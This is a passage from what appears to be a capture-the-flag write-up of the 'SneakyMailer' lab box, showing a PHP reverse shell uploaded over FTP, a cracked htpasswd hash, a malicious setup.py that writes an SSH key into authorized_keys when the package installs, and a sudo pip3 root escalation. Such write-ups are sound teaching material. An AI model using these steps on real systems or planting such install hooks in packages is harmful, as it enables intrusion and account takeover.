<p>I lost some of my screenshots after the step above, but here is the final configuration.</p>
<p><div class="img-container"><img src="imgs/8ded1188afee41fd852d14e4943fc9b4.png" alt=""  /></div>
</p>
<p>Lastly, enter <code>paulbyrd</code>&rsquo;s password, <code>^(#J@SkFv2[%KhIxKk(Ju`hqcHl&lt;:Ht</code>, if the app asks for it after applying the configuration. Now wait until it fetches all the emails from the server.</p>
<h4 id="retrieving-the-emails">Retrieving the emails</h4>
<p>In Paul&rsquo;s mailbox, I found two emails inside the &ldquo;Sent Items&rdquo; folder.</p>
<p>The first email was sent with the subject of &ldquo;Password Reset&rdquo;. In this email, Paul asks the administrator to change the developer account password. I&rsquo;ll grab the credentials of the developer account.</p>
<p><div class="img-container"><img src="imgs/540344afea7f42debd7cdc36f3fadd32.png" alt=""  /></div>
</p>
<p>The second email was sent with the subject &ldquo;Module testing&rdquo;, but right now I&rsquo;m not sure what it is about.</p>
<p><div class="img-container"><img src="imgs/f11b8bd4b2934eb892f681d23a369cdd-1619628769041.png" alt=""  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="ftp-access">FTP Access</h4>
<p>The developer account can be used to access the FTP server. There is only one directory called<code>/dev</code> in the FTP root directory.</p>
<p><div class="img-container"><img src="imgs/f761f7b9b264477ebae8d690c347cbef.png" alt=""  /></div>
</p>
<p>I access the FTP server via browser. The files inside this FTP look the same files as the one hosted on <code>sneakycorp.htb</code>, except it has the additional word &ldquo;dev&rdquo; in the title.</p>
<p><div class="img-container"><img src="imgs/cea046ccdffc4e0f83620407c53726d5.png" alt=""  /></div>
</p>
<h4 id="reverse-shell-via-ftp-upload">Reverse Shell via FTP Upload</h4>
<p>It turns out that the developer account has write permission on the <code>/dev</code> directory, so I can drop a PHP reverse shell payload there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">211-FTP server status:
</span></span><span class="line"><span class="cl">     Connected to ::ffff:10.10.14.20
</span></span><span class="line"><span class="cl">     Logged in as developer
</span></span><span class="line"><span class="cl">     TYPE: ASCII
</span></span><span class="line"><span class="cl">     No session bandwidth limit
</span></span><span class="line"><span class="cl">     Session timeout in seconds is <span class="m">300</span>
</span></span><span class="line"><span class="cl">     Control connection is plain text
</span></span><span class="line"><span class="cl">     Data connections will be plain text
</span></span><span class="line"><span class="cl">     At session startup, client count was <span class="m">1</span>
</span></span><span class="line"><span class="cl">     vsFTPd 3.0.3 - secure, fast, stable
</span></span><span class="line"><span class="cl">ftp&gt; <span class="nb">cd</span> /dev
</span></span><span class="line"><span class="cl"><span class="m">250</span> Directory successfully changed.
</span></span><span class="line"><span class="cl">ftp&gt; put /shares/reversef.php iamf.php
</span></span><span class="line"><span class="cl">local: /shares/reversef.php remote: iamf.php
</span></span><span class="line"><span class="cl"><span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
</span></span><span class="line"><span class="cl"><span class="m">150</span> Ok to send data.
</span></span><span class="line"><span class="cl"><span class="m">226</span> Transfer complete.
</span></span><span class="line"><span class="cl"><span class="m">72</span> bytes sent in 0.00 secs <span class="o">(</span>2.8610 MB/s<span class="o">)</span>
</span></span></code></pre></div><p>The uploaded web shell is available on <code>http://dev.sneakycorp.htb/iamf.php</code>. I will add <code>dev.sneakycorp.htb</code> to my <code>/etc/hosts</code> first.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.194&#39;</span> &gt;&gt; dev.sneakycorp.htb
</span></span></code></pre></div><p>Now I can trigger my web shell with curl.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ curl -s http://dev.sneakycorp.htb/iamf.php
</span></span></code></pre></div><p>My listener has an interactive shell now.</p>
<p><div class="img-container"><img src="imgs/43276abaf55b4760822901631d8c21de.png" alt=""  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-low">Shell as low</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>In <code>/var/www</code>, I found another subdomain. The new is <code>pypi.sneakycorp.htb</code>, I&rsquo;ll add it to my <code>/etc/hosts</code> file.</p>
<p><div class="img-container"><img src="imgs/image-20210429003013735.png" alt=""  /></div>
</p>
<p>I discovered <code>.htpasswd</code> file inside <code>pypi.sneakycorp.htb</code>, which contains PyPI credentials.</p>
<p><div class="img-container"><img src="imgs/image-20210429003321320.png" alt=""  /></div>
</p>
<p>I&rsquo;ll save <code>pypi:$apr1$RV5c5YVs$U9.OTqF5n8K4mxWpSSR/p/</code> to my note and send it to my Windows for cracking. In <code>/home</code> there is no user called <code>pypi</code>, so it might be used for something else.</p>
<h4 id="cracking-password">Cracking Password</h4>
<p>The password can be cracked easily with John the Ripper.</p>
<p><div class="img-container"><img src="imgs/image-20210429003613068.png" alt=""  /></div>
</p>
<p>The password is <code>soufianeelhaoui</code></p>
<h4 id="malicious-pypi-package">Malicious PyPI package</h4>
<p>Looking at the web configuration file, there is another domain <code>pypi.sneakycorp.htb</code> which is accessible on <code>localhost:5000</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210429005849918.png" alt=""  /></div>
</p>
<p>It also accessible from remote on port 8080 if I specify the hostname, <code>pypi.sneakycorp.htb</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210429005829551.png" alt=""  /></div>
</p>
<p>Based on the second email that Paul sent to user law.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Hello low
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your current task is to install, test and then erase every python module you 
</span></span><span class="line"><span class="cl">find in our PyPI service, let me know if you have any inconvenience.
</span></span></code></pre></div><p>The idea is that I can create my own PyPI package, of course a malicious one, upload it (via local or remote), and then let user <code>low</code> install the package (configured by the box&rsquo;s author automatically).</p>
<p>To create a package, I&rsquo;ll use the official site tutorial as my reference:</p>
<ul>
<li><a href="https://packaging.python.org/tutorials/packaging-projects/">https://packaging.python.org/tutorials/packaging-projects/</a></li>
<li>And you might want to read this too, <a href="https://packaging.python.org/specifications/pypirc/">https://packaging.python.org/specifications/pypirc/</a></li>
</ul>
<p>First, I&rsquo;ll get the <code>setup.py</code> template which looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">setuptools</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;README.md&#34;</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fh</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">long_description</span> <span class="o">=</span> <span class="n">fh</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">    <span class="n">name</span><span class="o">=</span><span class="s2">&#34;example-pkg-YOUR-USERNAME-HERE&#34;</span><span class="p">,</span> <span class="c1"># Replace with your own username</span>
</span></span><span class="line"><span class="cl">    <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">long_description</span><span class="o">=</span><span class="n">long_description</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="n">project_urls</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Bug Tracker&#34;</span><span class="p">:</span> <span class="s2">&#34;https://github.com/pypa/sampleproject/issues&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="p">],</span>
</span></span><span class="line"><span class="cl">    <span class="n">package_dir</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;&#34;</span><span class="p">:</span> <span class="s2">&#34;src&#34;</span><span class="p">},</span>
</span></span><span class="line"><span class="cl">    <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(</span><span class="n">where</span><span class="o">=</span><span class="s2">&#34;src&#34;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="n">python_requires</span><span class="o">=</span><span class="s2">&#34;&gt;=3.6&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></div><p>My goal is only to insert my SSH public key to <code>low</code>&rsquo;s authorized_keys, so I&rsquo;ll need to modify the code to this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">setuptools</span>
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;/home/low/.ssh/authorized_keys&#34;</span><span class="p">,</span> <span class="s2">&#34;w&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINtXqxDD334hQ3aaabbbssssdd&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl"><span class="n">setuptools</span><span class="o">.</span><span class="n">setup</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="o">=</span><span class="s2">&#34;low&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">version</span><span class="o">=</span><span class="s2">&#34;0.0.1&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">author</span><span class="o">=</span><span class="s2">&#34;Example Author&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">author_email</span><span class="o">=</span><span class="s2">&#34;author@example.com&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">description</span><span class="o">=</span><span class="s2">&#34;A small example package&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">long_description</span><span class="o">=</span><span class="s2">&#34;&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">long_description_content_type</span><span class="o">=</span><span class="s2">&#34;text/markdown&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="n">url</span><span class="o">=</span><span class="s2">&#34;https://github.com/pypa/sampleproject&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="n">packages</span><span class="o">=</span><span class="n">setuptools</span><span class="o">.</span><span class="n">find_packages</span><span class="p">(),</span>
</span></span><span class="line"><span class="cl">     <span class="n">classifiers</span><span class="o">=</span><span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Programming Language :: Python :: 3&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;License :: OSI Approved :: MIT License&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;Operating System :: OS Independent&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">     <span class="p">],</span>
</span></span><span class="line"><span class="cl"><span class="p">)</span>
</span></span></code></pre></div><p>From the link above, in order to upload a package to the PyPI server, a file called <code>.pypirc</code> must be present at <code>$HOME/.pypirc</code>.</p>
<p>The file is required for authentication, so I&rsquo;ll create one and put the PyPI credentials I obtained before.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[distutils]
</span></span><span class="line"><span class="cl">index-servers =
</span></span><span class="line"><span class="cl"> local
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">[local]
</span></span><span class="line"><span class="cl">repository: http://127.0.0.1:5000
</span></span><span class="line"><span class="cl">username: pypi
</span></span><span class="line"><span class="cl">password: soufianeelhaoui
</span></span></code></pre></div><p>If I wanted to upload remotely, my <code>.pypirc</code> would look like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[distutils]
</span></span><span class="line"><span class="cl">index-servers =
</span></span><span class="line"><span class="cl"> remote
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">[remote]
</span></span><span class="line"><span class="cl">repository: http://pypi.sneakycorp.htb:8080
</span></span><span class="line"><span class="cl">username: pypi
</span></span><span class="line"><span class="cl">password: soufianeelhaoui
</span></span></code></pre></div><p>I&rsquo;ll transfer <code>setup.py</code> and <code>.pypirc</code> to <code>/dev/shm</code> of SneakyMailer via Python http server.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «exploits» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ python3 -m http.server <span class="m">80</span>
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">80</span> <span class="o">(</span>http://0.0.0.0:80/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:12<span class="o">]</span> <span class="s2">&#34;GET /.pypirc HTTP/1.1&#34;</span> <span class="m">200</span> -
</span></span><span class="line"><span class="cl">10.10.10.197 - - <span class="o">[</span>12/Jul/2020  08:24:29<span class="o">]</span> <span class="s2">&#34;GET /setup.py HTTP/1.1&#34;</span> <span class="m">200</span> -
</span></span></code></pre></div><p>On SneakyMailer:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/.pypirc &gt; .pypirc
</span></span><span class="line"><span class="cl">www-data@sneakymailer:/dev/shm$ curl -s http://10.10.14.42/setup.py &gt; setup.py
</span></span></code></pre></div><p>Now at <code>/dev/shm</code>, the folder structure looks like this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">.
</span></span><span class="line"><span class="cl">├── .pypirc
</span></span><span class="line"><span class="cl">├── iamf.php
</span></span><span class="line"><span class="cl">└── setup.py
</span></span></code></pre></div><p>The last part is set <code>$HOME</code> to <code>/dev/shm</code>, because <code>.pypirc</code> should be placed at <code>$HOME/.pypirc</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@sneakymailer:/dev/shm$ <span class="nb">export</span> <span class="nv">$HOME</span><span class="o">=</span>/dev/shm
</span></span></code></pre></div><p>After all is set, I can start uploading the malicious package I made to the PyPI server locally using the command below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@sneakymailer:~$ python3 setup.py sdist upload -r <span class="nb">local</span>
</span></span><span class="line"><span class="cl">running sdist
</span></span><span class="line"><span class="cl">running egg_info
</span></span><span class="line"><span class="cl">writing low.egg-info/PKG-INFO
</span></span><span class="line"><span class="cl">writing dependency_links to low.egg-info/dependency_links.txt
</span></span><span class="line"><span class="cl">writing top-level names to low.egg-info/top_level.txt
</span></span><span class="line"><span class="cl">reading manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
</span></span><span class="line"><span class="cl">writing manifest file <span class="s1">&#39;low.egg-info/SOURCES.txt&#39;</span>
</span></span><span class="line"><span class="cl">warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md
</span></span><span class="line"><span class="cl">running check
</span></span><span class="line"><span class="cl">creating low-0.0.1
</span></span><span class="line"><span class="cl">creating low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying files to low-0.0.1…
</span></span><span class="line"><span class="cl">copying setup.py -&gt; low-0.0.1
</span></span><span class="line"><span class="cl">copying low.egg-info/PKG-INFO -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying low.egg-info/SOURCES.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying low.egg-info/dependency_links.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">copying low.egg-info/top_level.txt -&gt; low-0.0.1/low.egg-info
</span></span><span class="line"><span class="cl">Writing low-0.0.1/setup.cfg
</span></span><span class="line"><span class="cl">Creating tar archive
</span></span><span class="line"><span class="cl">removing <span class="s1">&#39;low-0.0.1&#39;</span> <span class="o">(</span>and everything under it<span class="o">)</span>
</span></span><span class="line"><span class="cl">running upload
</span></span><span class="line"><span class="cl">Submitting dist/low-0.0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
</span></span><span class="line"><span class="cl">Server response <span class="o">(</span>200<span class="o">)</span>: OK
</span></span><span class="line"><span class="cl">WARNING: Uploading via this <span class="nb">command</span> is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
</span></span></code></pre></div><p>As long as I see the server response is 200, that means I have successfully uploaded the package.</p>
<h4 id="ssh-access">SSH Access</h4>
<p>Now I can login with my private key as user <code>low</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «sneakymailer» «10.10.14.42» 
</span></span><span class="line"><span class="cl">$ ssh -i id_ecdsa low@10.10.10.197
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210429021145269.png" alt=""  /></div>
</p>
<p>User flag is done here.</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="abusing-sudo-pip">Abusing sudo pip</h4>
<p>User <code>low</code> has sudo privileges on <code>/usr/bin/pip3</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210429021533891.png" alt=""  /></div>
</p>
<p>I&rsquo;ll follow the instruction from <a href="https://gtfobins.github.io/gtfobins/pip/">GTFOBins</a> to abuse this circumstance to obtain the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nb">echo</span> <span class="s1">&#39;raise Exception(open(&#34;/root/root.txt&#34;).read())&#39;</span> &gt; <span class="nv">$TF</span>/setup.py
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ sudo pip3 install <span class="nv">$TF</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210429021914961.png" alt=""  /></div>
</p>
<p>Or to get a shell as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp -d<span class="k">)</span>
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ <span class="nb">echo</span> <span class="s2">&#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> &gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2"> 2&gt;</span><span class="k">$(</span>tty<span class="k">)</span><span class="s2">&#39;)&#34;</span> &gt; <span class="nv">$TF</span>/setup.py
</span></span><span class="line"><span class="cl">low@sneakymailer:~$
</span></span><span class="line"><span class="cl">low@sneakymailer:~$ sudo pip3 install <span class="nv">$TF</span>
</span></span><span class="line"><span class="cl">sudo: Unable to resolve host sneakymailer: Temporary failure in name resolution
</span></span><span class="line"><span class="cl">Processing /tmp/tmp.9ShSegy5bm
</span></span><span class="line"><span class="cl"><span class="c1"># whoami</span>
</span></span><span class="line"><span class="cl">root
</span></span><span class="line"><span class="cl"><span class="c1"># id</span>
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</span></span></code></pre></div>]]></content:encoded>
    </item>
    
  </channel>
</rss>
